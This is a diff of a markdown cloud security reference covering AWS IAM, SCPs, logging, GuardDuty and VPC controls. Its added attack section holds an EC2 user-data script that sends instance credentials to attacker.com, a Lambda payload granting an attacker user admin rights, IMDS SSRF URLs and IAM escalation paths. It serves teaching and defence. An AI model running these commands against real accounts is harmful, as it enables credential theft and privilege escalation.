@@ -1,1303 +1,2579 @@
-# Cloud Security Reference
+# Cloud Security Reference Library
 
-A comprehensive reference for cloud security across AWS, Azure, and GCP — covering shared responsibility, native security services, IAM deep dives, attack techniques, CSPM, Kubernetes security, serverless, detection & response, and compliance frameworks.
+> Comprehensive cybersecurity reference for AWS, Azure, GCP, multi-cloud attack tooling, IAM, data security, CNAPP, and compliance. Maintained by TeamStarWolf.
 
 ---
 
 ## Table of Contents
 
-- [Cloud Shared Responsibility Model](#1-cloud-shared-responsibility-model)
-- [AWS Security — Native Services & Controls](#2-aws-security--native-services--controls)
-  - [IAM Deep Dive](#iam-deep-dive)
-  - [AWS Security Services](#aws-security-services)
-  - [AWS Attacks & Misconfigurations](#aws-attacks--misconfigurations)
-  - [AWS Logging & Detection](#aws-logging--detection)
-- [Azure Security — Native Services & Controls](#3-azure-security--native-services--controls)
-  - [Microsoft Entra ID & RBAC](#microsoft-entra-id--rbac)
-  - [Azure Security Services](#azure-security-services)
-  - [Azure Attacks & Misconfigurations](#azure-attacks--misconfigurations)
-  - [Azure Logging & Detection](#azure-logging--detection)
-- [GCP Security — Native Services & Controls](#4-gcp-security--native-services--controls)
-  - [IAM & Resource Hierarchy](#iam--resource-hierarchy)
-  - [GCP Security Services](#gcp-security-services)
-  - [GCP Attacks](#gcp-attacks)
-- [Cloud Attack Frameworks & Tools](#5-cloud-attack-frameworks--tools)
-- [Cloud Security Posture Management (CSPM)](#6-cloud-security-posture-management-cspm)
-- [Kubernetes Security](#7-kubernetes-security)
-- [Serverless Security](#8-serverless-security)
-- [Cloud Detection & Response](#9-cloud-detection--response)
-- [Cloud Compliance & Frameworks](#10-cloud-compliance--frameworks)
+1. [AWS Security Fundamentals](#1-aws-security-fundamentals)
+2. [AWS Attack Techniques](#2-aws-attack-techniques)
+3. [Azure Security](#3-azure-security)
+4. [Azure Attack Techniques](#4-azure-attack-techniques)
+5. [GCP Security](#5-gcp-security)
+6. [Multi-Cloud Attack Tools](#6-multi-cloud-attack-tools)
+7. [Cloud IAM Security & Least Privilege](#7-cloud-iam-security--least-privilege)
+8. [Cloud Data Security](#8-cloud-data-security)
+9. [Cloud Native Security (CNAPP)](#9-cloud-native-security-cnapp)
+10. [Serverless, DevSecOps & Cloud Compliance](#10-serverless-devsecops--cloud-compliance)
 
 ---
 
-## 1. Cloud Shared Responsibility Model
+## 1. AWS Security Fundamentals
 
-Understanding the division of security duties between cloud provider and customer is the foundation of every cloud security program. Misunderstanding this boundary is one of the most common sources of cloud breaches.
+### 1.1 IAM Core Concepts
 
-### Shared Responsibility Comparison Table
+**Identity and Access Management (IAM)** is the foundational access control plane for AWS. Every API call is authorized through IAM.
 
-| Layer | IaaS (e.g. EC2, Azure VMs, GCE) | PaaS (e.g. RDS, Azure App Service, Cloud Run) | SaaS (e.g. M365, Google Workspace) |
-|---|---|---|---|
-| Physical / Data Center | **Provider** | **Provider** | **Provider** |
-| Network Infrastructure | **Provider** | **Provider** | **Provider** |
-| Hypervisor / Host OS | **Provider** | **Provider** | **Provider** |
-| Guest OS / VM OS | **Customer** | **Provider** | **Provider** |
-| Middleware / Runtime | **Customer** | **Provider** | **Provider** |
-| Application Code | **Customer** | **Customer** | **Provider** |
-| Application Data | **Customer** | **Customer** | **Customer** |
-| Identity & Access | **Customer** | **Customer** | **Customer** |
-| Network Controls (SG/NSG) | **Customer** | **Shared** | **Provider** |
-| Client Endpoints | **Customer** | **Customer** | **Customer** |
+#### Policy Types and Evaluation Order
 
-### Provider Responsibilities (All Models)
-- Physical security of data centers (SOC 2, ISO 27001, FedRAMP-authorized facilities)
-- Hardware maintenance, replacement, and disposal (secure media sanitization)
-- Global network backbone, DDoS scrubbing at infrastructure layer
-- Hypervisor isolation between tenants
-- Core managed service availability and patching (e.g., AWS RDS engine patching)
-
-### Customer Responsibilities (All Models)
-- Identity and access management: user accounts, MFA enforcement, role assignments
-- Data classification and encryption (at rest and in transit)
-- Network access controls: security groups, NACLs, NSGs, firewall rules
-- Monitoring and logging: enabling CloudTrail, Azure Monitor, GCP Cloud Audit Logs
-- Vulnerability management for customer-managed OS and application layers
-- Incident response procedures and business continuity planning
-
-### Common Customer Misconfigurations
-
-| Misconfiguration | Risk | Detection |
+| Policy Type | Scope | Precedence |
 |---|---|---|
-| Public S3 bucket / Azure Blob container | Unauthenticated data access | AWS Config, Macie, Defender for Cloud |
-| Security group / NSG open to 0.0.0.0/0 | Unrestricted inbound access to sensitive ports | AWS Config rule `restricted-ssh`, Azure Policy |
-| No MFA enforced for console/portal access | Account takeover via credential stuffing | IAM credential report, Entra Sign-in Logs |
-| Weak or overpermissive IAM policies | Privilege escalation to full admin | IAM Access Analyzer, PMapper, Prowler |
-| Secrets and API keys in source code / env vars | Credential theft from repo scan or logs | Macie, truffleHog, GitGuardian, Gitleaks |
-| Unencrypted EBS volumes / storage accounts | Data exposure on snapshot share | AWS Config `encrypted-volumes`, Defender for Cloud |
-| No CloudTrail / audit logging | Blind to all API activity | AWS Security Hub CIS check 2.1 |
-| Default VPC with default security groups | Unintended broad connectivity | AWS Config, Prowler check `vpc_default_restrict` |
-| IMDSv1 enabled on EC2 (no token requirement) | SSRF → credential theft | AWS Config `ec2-imdsv2-check` |
-| Service account keys stored long-term (GCP) | Key exfiltration → persistent access | SCC, IAM recommender |
+| Service Control Policy (SCP) | AWS Organizations (OU/Account) | Guardrail — overrides identity policies |
+| Permission Boundary | IAM principal (user/role) | Maximum permissions ceiling |
+| Identity-based Policy | User, Group, Role | Grant permissions |
+| Resource-based Policy | S3, KMS, Lambda, SQS, etc. | Cross-account access |
+| Session Policy | Temporary credentials (AssumeRole) | Further restrict session |
+| ACL | S3, VPC | Legacy cross-account |
 
----
-
-## 2. AWS Security — Native Services & Controls
-
-### IAM Deep Dive
-
-AWS Identity and Access Management (IAM) is the central authorization layer for all AWS API calls. Every API call to AWS is authenticated (via access key or session token) and authorized (via policy evaluation).
+**Evaluation logic** (simplified):
+1. Explicit DENY anywhere → DENY
+2. SCP does not ALLOW → DENY (implicit)
+3. Permission boundary does not ALLOW → DENY
+4. Resource-based policy ALLOWs → ALLOW (same account)
+5. Identity-based policy ALLOWs → ALLOW
+6. Default → DENY
 
 #### IAM Policy Structure
 
-Every IAM policy is a JSON document with one or more statements:
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Sid": "ExampleAllow",
+    "Effect": "Allow",
+    "Action": ["s3:GetObject", "s3:ListBucket"],
+    "Resource": ["arn:aws:s3:::my-bucket", "arn:aws:s3:::my-bucket/*"],
+    "Condition": {
+      "StringEquals": {"aws:RequestedRegion": "us-east-1"},
+      "Bool": {"aws:SecureTransport": "true"}
+    }
+  }]
+}
+```
+
+**Key condition operators**: `StringEquals`, `StringLike` (wildcards), `ArnLike`, `IpAddress`, `Bool`, `DateGreaterThan`, `NumericLessThan`, `Null`, `ForAllValues:StringEquals`, `ForAnyValue:StringLike`
+
+**Global condition keys**: `aws:PrincipalArn`, `aws:SourceIp`, `aws:SourceVpc`, `aws:SourceVpce`, `aws:RequestedRegion`, `aws:MultiFactorAuthPresent`, `aws:TokenIssueTime`, `aws:PrincipalOrgID`, `aws:PrincipalTag/<key>`, `aws:ResourceTag/<key>`, `aws:CalledVia`
+
+#### IAM Roles
+
+- **Assumed** via `sts:AssumeRole` — returns temporary credentials (AccessKeyId, SecretAccessKey, SessionToken, Expiration)
+- **Trust policy** (resource-based policy on the role) controls who can assume it
+- **Session duration**: 1 hour default, up to 12 hours (configurable)
+- **Role chaining**: each hop resets max session to 1 hour
+- **Service roles**: trusted by AWS services (ec2.amazonaws.com, lambda.amazonaws.com, etc.)
+- **Cross-account roles**: principal in Account A assumes role in Account B
+
+#### Service Control Policies (SCPs)
+
+SCPs are applied at AWS Organizations level. They define the **maximum permissions** for accounts in an OU.
 
 ```json
 {
   "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Sid": "S3ReadSpecificBucket",
-      "Effect": "Allow",
-      "Action": ["s3:GetObject", "s3:ListBucket"],
-      "Resource": [
-        "arn:aws:s3:::company-app-bucket",
-        "arn:aws:s3:::company-app-bucket/*"
-      ],
-      "Condition": {
-        "Bool": {"aws:SecureTransport": "true"},
-        "StringEquals": {"aws:RequestedRegion": "us-east-1"}
-      }
-    }
-  ]
+  "Statement": [{
+    "Sid": "DenyLeaveOrganization",
+    "Effect": "Deny",
+    "Action": "organizations:LeaveOrganization",
+    "Resource": "*"
+  }]
 }
 ```
 
-| Field | Description |
+Common SCP patterns:
+- Deny actions outside approved regions (`aws:RequestedRegion` condition)
+- Deny disabling CloudTrail (`cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`)
+- Deny root account usage (`aws:PrincipalType: Root`)
+- Deny creating IAM users (enforce SSO/IdP)
+- Deny public S3 buckets (`s3:PutBucketPublicAccessBlock` deny with condition)
+
+#### Permission Boundaries
+
+A permission boundary is an IAM managed policy attached to an IAM entity that sets the **maximum permissions** that identity-based policies can grant. Used to delegate permission management safely.
+
+```bash
+# Attach permission boundary to role
+aws iam create-role --role-name DevRole \
+  --permissions-boundary arn:aws:iam::123456789012:policy/DevBoundary \
+  --assume-role-policy-document file://trust.json
+```
+
+#### IAM Access Analyzer
+
+- **Purpose**: Identify resources shared with external entities (outside account/org)
+- **Resource types analyzed**: S3 buckets, IAM roles, KMS keys, Lambda functions/layers, SQS queues, Secrets Manager secrets
+- **Finding types**: `Public`, `CrossAccount`, `CrossOrganization`, `ThirdParty`
+- **Policy validation**: Checks policies against IAM best practices (security warnings, errors, suggestions)
+- **Policy generation**: Learns from CloudTrail to suggest least-privilege policies
+- **Unused access analyzer**: Identifies unused roles, permissions, and access keys (IAM Access Analyzer for unused access)
+
+```bash
+# List findings
+aws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/MyAnalyzer
+# Validate policy
+aws accessanalyzer validate-policy --policy-document file://policy.json --policy-type IDENTITY_POLICY
+```
+
+---
+
+### 1.2 AWS Organizations & Control Tower
+
+**AWS Organizations** provides hierarchical account management:
+- **Management account** (formerly master): creates and manages member accounts
+- **Organizational Units (OUs)**: logical groupings (e.g., Prod OU, Dev OU, Security OU)
+- **SCPs**: applied to OUs and accounts (not management account)
+
+**AWS Control Tower** builds a landing zone with:
+- **Guardrails** (now called Controls): preventive (SCPs), detective (AWS Config rules), proactive (CloudFormation hooks)
+- **Account Factory**: standardized account vending via Service Catalog
+- **Log Archive account**: centralized CloudTrail and Config logs
+- **Audit account**: security tooling (Security Hub, GuardDuty aggregator)
+- **Customizations for Control Tower (CfCT)**: GitOps-style customization pipeline
+
+---
+
+### 1.3 AWS Config
+
+**AWS Config** continuously records resource configurations and evaluates against rules.
+
+| Rule Type | Description |
 |---|---|
-| `Version` | Always `"2012-10-17"` for modern policies |
-| `Sid` | Optional statement identifier for readability |
-| `Effect` | `Allow` or `Deny` |
-| `Action` | AWS service:action pairs (e.g., `s3:GetObject`, `ec2:DescribeInstances`) |
-| `Resource` | ARN of the resource(s) the statement applies to; `*` = all |
-| `Principal` | Used in resource-based policies; identifies who the policy applies to |
-| `Condition` | Optional conditions: IP range, MFA required, time of day, secure transport |
+| AWS Managed Rules | Pre-built (s3-bucket-public-read-prohibited, iam-password-policy, etc.) |
+| Custom Lambda Rules | Custom evaluation logic |
+| Custom Policy Rules (Guard) | CloudFormation Guard DSL |
 
-#### IAM Policy Types
+Key managed rules:
+- `iam-root-access-key-check` — root account has no access keys
+- `mfa-enabled-for-iam-console-access` — MFA required
+- `s3-bucket-server-side-encryption-enabled`
+- `encrypted-volumes` — EBS volumes encrypted
+- `rds-instance-public-access-check`
+- `cloudtrail-enabled`
+- `vpc-flow-logs-enabled`
+- `access-keys-rotated` — keys rotated within 90 days
 
-| Policy Type | Where Attached | Purpose |
+**Config Aggregator**: Collects data across accounts/regions for centralized compliance view.
+
+**Conformance Packs**: Collections of Config rules deployed as a unit (CIS, PCI, NIST templates available).
+
+---
+
+### 1.4 CloudTrail
+
+**CloudTrail** records API calls (management events and data events).
+
+| Event Type | Description | Default |
 |---|---|---|
-| Identity-based | IAM users, groups, roles | Grant permissions to AWS principals |
-| Resource-based | AWS resources (S3 bucket, KMS key, etc.) | Grant cross-account access, define trust |
-| Service Control Policies (SCPs) | AWS Organizations OU/account | Hard guardrails; cap maximum permissions |
-| Permission Boundaries | IAM users/roles | Constrain effective permissions without granting |
-| Session Policies | STS sessions | Further restrict permissions in an assumed session |
+| Management Events | Control plane (CreateBucket, RunInstances, etc.) | Enabled (free for first copy) |
+| Data Events | Data plane (S3 GetObject, Lambda Invoke, DynamoDB operations) | Disabled (extra cost) |
+| Insights Events | Unusual API activity detection | Disabled (extra cost) |
 
-#### IAM Policy Evaluation Logic
+```bash
+# Look up events (past 90 days in console)
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
+# Query with CloudTrail Lake (SQL)
+aws cloudtrail start-query --query-statement "SELECT * FROM EDS_ID WHERE eventName='AssumeRole' AND errorCode IS NOT NULL"
+```
 
-AWS evaluates policies in this order (first explicit deny wins):
+**Security considerations**:
+- Enable multi-region trail and log file validation (`--enable-log-file-validation`)
+- Send logs to dedicated S3 bucket with bucket policy denying delete/modify
+- Enable S3 Object Lock (WORM) on log bucket
+- Send to CloudWatch Logs for real-time alerting
+- Encrypt with KMS CMK
 
-1. **Explicit Deny** — Any deny in any policy stops evaluation immediately
-2. **SCP** — Organization policy must allow the action for the account
-3. **Permission Boundary** — Must allow the action if set
-4. **Identity Policy** — The user/role's own policy must allow
-5. **Resource Policy** — Cross-account: both identity and resource policy must allow; same-account: either suffices
+---
 
-#### Service Control Policy — Protect Logging and Org Membership
+### 1.5 GuardDuty
+
+GuardDuty is a managed threat detection service using ML, anomaly detection, and threat intelligence.
+
+**Finding categories and examples**:
+
+| Category | Example Finding | Description |
+|---|---|---|
+| Backdoor | `Backdoor:EC2/C&CActivity.B` | EC2 communicating with known C2 |
+| Behavior | `Behavior:EC2/NetworkPortUnusual` | Unusual network port activity |
+| CryptoCurrency | `CryptoCurrency:EC2/BitcoinTool.B` | Mining tool communication |
+| Discovery | `Discovery:S3/MaliciousIPCaller` | S3 enumeration from malicious IP |
+| Exfiltration | `Exfiltration:S3/ObjectRead.Unusual` | Unusual S3 read activity |
+| Impact | `Impact:EC2/WinRMBruteForce` | Brute force attack |
+| InitialAccess | `InitialAccess:IAM/AnomalousBehavior` | Anomalous IAM console login |
+| Persistence | `Persistence:IAM/UserCreated` | New IAM user created |
+| Policy | `Policy:S3/BucketPublicAccessGranted` | S3 made public |
+| PrivilegeEscalation | `PrivilegeEscalation:IAM/AnomalousBehavior` | Suspicious permission escalation |
+| Recon | `Recon:IAM/MaliciousIPCaller` | IAM enumeration from malicious IP |
+| Stealth | `Stealth:IAMUser/CloudTrailLoggingDisabled` | CloudTrail disabled |
+| UnauthorizedAccess | `UnauthorizedAccess:IAM/ConsoleLoginSuccess.B` | Unusual console login |
+
+**GuardDuty data sources**: VPC Flow Logs, DNS query logs, CloudTrail management events, CloudTrail S3 data events (S3 Protection), EKS audit logs (EKS Protection), Lambda network activity (Lambda Protection), RDS login activity, Runtime monitoring (EC2/ECS/EKS agent-based)
+
+---
+
+### 1.6 Security Hub
+
+Aggregates findings from GuardDuty, Inspector, Macie, IAM Access Analyzer, Firewall Manager, and third-party tools. Evaluates against security standards.
+
+**Supported standards**:
+- **AWS Foundational Security Best Practices (FSBP)**: AWS-specific controls
+- **CIS AWS Foundations Benchmark**: v1.2, v1.4, v3.0
+- **PCI DSS**: v3.2.1, v4.0
+- **NIST SP 800-53**: Rev 5
+- **SOC 2**
+
+**Finding format**: AWS Security Finding Format (ASFF) — standardized JSON schema.
+
+---
+
+### 1.7 Amazon Detective, Macie, Inspector v2
+
+**Detective**: Graph-based investigation tool. Analyzes VPC Flow Logs, CloudTrail, GuardDuty findings. Builds behavior baselines. Use for: pivot analysis, IP/role activity summaries, GuardDuty finding investigation.
+
+**Macie**: ML-based sensitive data discovery in S3. Detects PII (names, SSNs, credit cards, credentials). Creates findings with severity. Managed data identifiers (100+ built-in) + custom data identifiers (regex + keywords).
+
+**Inspector v2**: Vulnerability management for EC2, Lambda, and ECR.
+- EC2: OS package vulnerabilities (CVE database), network reachability
+- Lambda: software composition analysis, code scanning
+- ECR: container image scanning on push/continuously
+- Risk score = CVSS score + network reachability + exploitability intelligence
+
+---
+
+### 1.8 WAF v2, Shield Advanced
+
+**AWS WAF v2**:
+- Attached to ALB, CloudFront, API Gateway, AppSync, Cognito, Verified Access
+- **Web ACL**: collection of rules evaluated in priority order
+- **Rule groups**: reusable rule collections (AWS Managed, marketplace, custom)
+- **Rule types**: rate-based, regex match, SQL injection match, XSS match, geo match, IP set, byte match, size constraint
+- **AWS Managed Rule Groups**: Core Rule Set (CRS), Known Bad Inputs, SQL database, Linux, POSIX, PHP, WordPress, IP reputation, Bot Control, Account Takeover Prevention (ATP), Fraud Control - Account Creation Fraud Prevention (ACFP)
+- **Logging**: to CloudWatch Logs, S3, Kinesis Data Firehose
+
+**Shield Standard** (automatic, free): L3/L4 DDoS protection for all AWS customers.
+
+**Shield Advanced** (paid): Enhanced L3/L4/L7 protection, Shield Response Team (SRT) access, attack diagnostics, cost protection for scaling during attacks. Attach to: CloudFront, Route53, ALB, ELB Classic, EIP, Global Accelerator.
+
+---
+
+### 1.9 VPC Security
+
+#### Security Groups vs NACLs
+
+| Feature | Security Groups | NACLs |
+|---|---|---|
+| Level | Instance (ENI) | Subnet |
+| Statefulness | Stateful (return traffic auto-allowed) | Stateless (explicit inbound+outbound rules) |
+| Rules | Allow only | Allow and Deny |
+| Evaluation | All rules evaluated | Rules evaluated in order (lowest number first) |
+| Default | Deny all inbound, allow all outbound | Allow all in/out |
+
+#### VPC Flow Logs
+
+Capture IP traffic for VPC, subnet, or ENI. Fields: `version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes windowstart windowend action flow-direction log-status`
+
+Custom format fields include: `vpc-id`, `subnet-id`, `instance-id`, `tcp-flags`, `type`, `pkt-srcaddr`, `pkt-dstaddr`, `region`, `az-id`, `sublocation-type`, `sublocation-id`, `pkt-src-aws-service`, `pkt-dst-aws-service`, `traffic-path`
+
+**Traffic-path values**: 1=through IGW, 2=through VGW, 3=Direct Connect, 4=VPC peering, 5=NAT gateway, 6=VPC endpoint, 7=Egress-only IGW, 8=Internet
+
+#### PrivateLink (VPC Endpoints)
+
+| Type | Description |
+|---|---|
+| Interface Endpoint (PrivateLink) | ENI in subnet, private IP, supports most services + third-party |
+| Gateway Endpoint | Route table entry, S3 and DynamoDB only (free) |
+| Gateway Load Balancer Endpoint | Inline traffic inspection |
+
+**Endpoint policies**: Resource-based policy controlling which principals/actions allowed through endpoint. Used to restrict S3 access to specific buckets from VPC.
 
 ```json
 {
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Sid": "DenyDisableCloudTrailAndLeaveOrg",
-      "Effect": "Deny",
-      "Action": [
-        "cloudtrail:DeleteTrail",
-        "cloudtrail:StopLogging",
-        "cloudtrail:UpdateTrail",
-        "organizations:LeaveOrganization",
-        "config:DeleteConfigurationRecorder",
-        "config:StopConfigurationRecorder",
-        "guardduty:DeleteDetector",
-        "guardduty:DisassociateFromMasterAccount",
-        "securityhub:DisableSecurityHub"
-      ],
-      "Resource": "*"
-    }
-  ]
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": "s3:GetObject",
+    "Resource": "arn:aws:s3:::my-approved-bucket/*"
+  }]
 }
 ```
 
-#### AWS STS (Security Token Service)
-
-| Operation | Use Case |
-|---|---|
-| `AssumeRole` | Cross-account access, delegation, EC2 instance profile |
-| `AssumeRoleWithWebIdentity` | OIDC federation (GitHub Actions, EKS workload identity) |
-| `AssumeRoleWithSAML` | SAML federation (corporate IdP → AWS console) |
-| `GetFederationToken` | Custom broker for temporary federated credentials |
-
-IAM Access Analyzer:
-- Identifies resources shared outside the account/organization (S3, KMS, IAM roles, Lambda, SQS, SNS)
-- Generates least-privilege policies from CloudTrail activity (policy generation feature)
-- Unused access findings: identify users/roles with permissions never exercised in 90 days
-
-#### Least Privilege Implementation Strategy
-
-1. Start with `Deny *` — never start with broad `Allow *`
-2. Identify exact API actions required (use IAM Access Analyzer policy generation from CloudTrail)
-3. Scope resources to specific ARNs; avoid `*` on sensitive services
-4. Add conditions: `aws:SecureTransport`, `aws:MultiFactorAuthPresent`, `aws:SourceVpc`, `aws:RequestedRegion`
-5. Attach to roles, not users; use groups for human access
-6. Rotate access keys; prefer instance profiles and OIDC over long-term keys
-7. Enable credential report and regularly review unused access
-
 ---
 
-### AWS Security Services
+## 2. AWS Attack Techniques
 
-| Service | Purpose | Key Features |
+### 2.1 IAM Privilege Escalation Paths
+
+Privilege escalation in AWS occurs when an attacker with limited permissions gains additional capabilities. Below are documented escalation paths.
+
+#### Direct Privilege Escalation
+
+| Technique | Required Permission | Result |
 |---|---|---|
-| **AWS GuardDuty** | Threat detection | ML-based anomaly detection; analyzes CloudTrail, VPC Flow Logs, DNS logs; 50+ finding types; Malware Protection for EBS/S3 |
-| **AWS SecurityHub** | Aggregated security findings | CIS/PCI/NIST benchmarks; cross-account and cross-region aggregation; ASFF finding format; automated remediation via EventBridge |
-| **AWS Config** | Configuration compliance | Managed and custom rules; conformance packs (CIS, NIST, PCI); auto-remediation with SSM Automation; resource relationship graph |
-| **AWS CloudTrail** | API audit logging | Management events (control plane) + data events (S3 object, Lambda invoke); log file integrity validation; organization trail |
-| **AWS Inspector v2** | Vulnerability scanning | EC2 via SSM Agent (no agent install); ECR container image scanning; Lambda function scanning; EPSS and CVSS scoring |
-| **AWS Macie** | S3 data classification | PII/sensitive data discovery; custom data identifiers; findings per S3 bucket; cross-account scanning |
-| **AWS WAF v2** | Web application firewall | Managed rule groups (OWASP, known bad inputs, IP reputation); rate limiting per IP/session; Bot Control; Fraud Control |
-| **AWS Shield Standard** | DDoS protection (free) | Layer 3/4 protection on all AWS resources; automatic SYN flood mitigation |
-| **AWS Shield Advanced** | DDoS protection (paid) | $3,000/month base; Layer 7 protection; SRT team access; DDoS cost protection; 24/7 proactive engagement |
-| **AWS KMS** | Key management | Customer Managed Keys (CMKs); automatic annual rotation; CloudHSM integration; key policies and grants; cross-region replica keys |
-| **AWS Secrets Manager** | Secrets storage | Automatic rotation via Lambda; cross-account access; VPC endpoint support; native RDS/Redshift/DocumentDB integration |
-| **AWS SSM** | Systems management | Session Manager (no SSH/bastion, VPC endpoint); Parameter Store (SecureString); Patch Manager; Run Command; Fleet Manager |
-| **AWS IAM Access Analyzer** | Access analysis | External access findings; unused access; policy validation; policy generation from CloudTrail |
-| **AWS Detective** | Security investigation | Automatically builds behavior baseline; VPC flow, CloudTrail, GuardDuty findings graph; visual investigation of findings |
-| **Amazon Security Lake** | Security data lake | OCSF-normalized data; multi-source (CloudTrail, VPC Flow, Route53, Security Hub, custom); subscriber model for SIEM/analytics |
-| **AWS Verified Access** | Zero trust network access | ZTNA for internal apps; integrates with AWS IAM Identity Center and SAML IdPs; no VPN required |
+| `iam:CreatePolicyVersion` | Set new default policy version | Add admin permissions to existing policy |
+| `iam:SetDefaultPolicyVersion` | Switch to older version with higher privs | Revert to permissive version |
+| `iam:CreateAccessKey` | On any user | Gain credentials of that user |
+| `iam:CreateLoginProfile` | On any user without password | Console access as that user |
+| `iam:UpdateLoginProfile` | On any user | Change password, assume identity |
+| `iam:AttachUserPolicy` | Any user + any policy | Attach AdministratorAccess to self |
+| `iam:AttachRolePolicy` | Any role | Attach admin policy to assumable role |
+| `iam:PutUserPolicy` | Any user | Add inline policy with admin perms |
+| `iam:AddUserToGroup` | Any group | Join admin group |
 
----
+#### PassRole-Based Escalation
 
-### AWS Attacks & Misconfigurations
+`iam:PassRole` is required to assign a role to an AWS service. Combined with service-creation permissions, it enables escalation.
 
-#### S3 Bucket Exposure
-
+**Lambda vector** (most common):
 ```bash
-# Check for public access on unauthenticated basis
-aws s3 ls s3://target-bucket-name --no-sign-request
+# Requirements: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
+# (or lambda:CreateEventSourceMapping for async trigger)
+aws lambda create-function \
+  --function-name escalate \
+  --runtime python3.12 \
+  --role arn:aws:iam::123456789012:role/AdminRole \
+  --handler index.handler \
+  --zip-file fileb://payload.zip
 
-# List all buckets (requires credentials)
-aws s3 ls
-
-# Check bucket ACL
-aws s3api get-bucket-acl --bucket target-bucket-name
-
-# Check bucket policy
-aws s3api get-bucket-policy --bucket target-bucket-name
-
-# Check public access block settings (should all be true)
-aws s3api get-public-access-block --bucket target-bucket-name
+aws lambda invoke --function-name escalate output.json
 ```
 
-#### SSRF to EC2 Instance Metadata Service (IMDS)
+Lambda payload to create admin user:
+```python
+import boto3
+def handler(event, context):
+    iam = boto3.client('iam')
+    iam.attach_user_policy(
+        UserName='attacker',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+```
 
-The EC2 metadata service at `169.254.169.254` exposes temporary IAM credentials. An SSRF vulnerability that can reach this IP can result in full credential theft.
-
+**EC2 vector**:
 ```bash
-# IMDSv1 (no token required — vulnerable)
-curl http://169.254.169.254/latest/meta-data/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+# Requirements: iam:PassRole + ec2:RunInstances + ec2:DescribeInstances
+# Launch EC2 with admin instance profile, use userdata to exfil credentials
+aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
+  --iam-instance-profile Name=AdminInstanceProfile \
+  --user-data '#!/bin/bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds
+curl -X POST https://attacker.com/creds -d @/tmp/creds'
+```
+
+**Other PassRole vectors**: CloudFormation (cfn:CreateStack), Glue (glue:CreateJob), SageMaker (sagemaker:CreateTrainingJob), CodeBuild (codebuild:CreateProject), ECS (ecs:RegisterTaskDefinition + ecs:RunTask), Data Pipeline (datapipeline:CreatePipeline)
+
+#### Additional Escalation Paths
+
+```
+sts:AssumeRole → assume any role listed in trust policy
+iam:UpdateAssumeRolePolicy → modify trust policy to add self as principal
+iam:CreateRole + iam:AttachRolePolicy → create new admin role, assume it
+codestar:CreateProject → creates roles with elevated permissions
+```
+
+---
+
+### 2.2 IMDSv1 SSRF Attacks vs IMDSv2
+
+#### IMDSv1 (Vulnerable)
+
+EC2 Instance Metadata Service available at `http://169.254.169.254/`. IMDSv1 accepts unauthenticated GET requests — any application with SSRF can query it.
+
+**Classic SSRF attack**:
+```bash
+# Attacker exploits SSRF in web app to fetch credentials
+curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# Returns role name, then:
+curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"
 # Returns: AccessKeyId, SecretAccessKey, Token, Expiration
+```
 
-# IMDSv2 (token required — mitigated)
-TOKEN=$(curl -s -X PUT \
-  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
-  http://169.254.169.254/latest/api/token)
+**Key endpoints**:
+```
+http://169.254.169.254/latest/meta-data/                              # metadata root
+http://169.254.169.254/latest/meta-data/iam/security-credentials/    # role name
+http://169.254.169.254/latest/meta-data/iam/info                     # instance profile ARN
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/... # instance identity
+http://169.254.169.254/latest/user-data                               # userdata (may have secrets)
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/dynamic/instance-identity/document     # account ID, region, instance ID
+```
+
+#### IMDSv2 (Hardened)
+
+Requires a session-oriented token. Token request uses PUT method with `X-aws-ec2-metadata-token-ttl-seconds` header — most SSRF vulnerabilities can only make GET requests, blocking exploitation.
+
+```bash
+# Legitimate IMDSv2 usage
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Use stolen creds
-export AWS_ACCESS_KEY_ID=ASIA...
-export AWS_SECRET_ACCESS_KEY=...
-export AWS_SESSION_TOKEN=...
-aws sts get-caller-identity
 ```
 
-**Mitigation:** Enforce IMDSv2 (`aws ec2 modify-instance-metadata-options --http-tokens required`) or use AWS Config rule `ec2-imdsv2-check`.
-
-#### IAM Privilege Escalation Paths
-
-Common escalation paths exploited by attackers with partial IAM permissions:
-
-| Permission | Escalation Technique |
-|---|---|
-| `iam:CreatePolicyVersion` | Create a new policy version with `AdministratorAccess` and set it as default |
-| `iam:SetDefaultPolicyVersion` | Switch an existing policy to a previously created permissive version |
-| `iam:AttachUserPolicy` | Attach `arn:aws:iam::aws:policy/AdministratorAccess` to own user |
-| `iam:AttachRolePolicy` | Attach admin policy to a role you can assume |
-| `iam:CreateAccessKey` (on other user) | Create new access keys for an admin user |
-| `iam:UpdateLoginProfile` | Reset console password for an admin user |
-| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin instance profile, use IMDS to get creds |
-| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with admin execution role, invoke to run arbitrary code |
-| `iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:RunTask` | Deploy ECS task with admin role |
-| `iam:PassRole` + `glue:CreateJob` + `glue:StartJobRun` | Execute Glue job with admin role |
-| `sts:AssumeRole` | Assume a role with broader permissions than current |
-
-**Tools:**
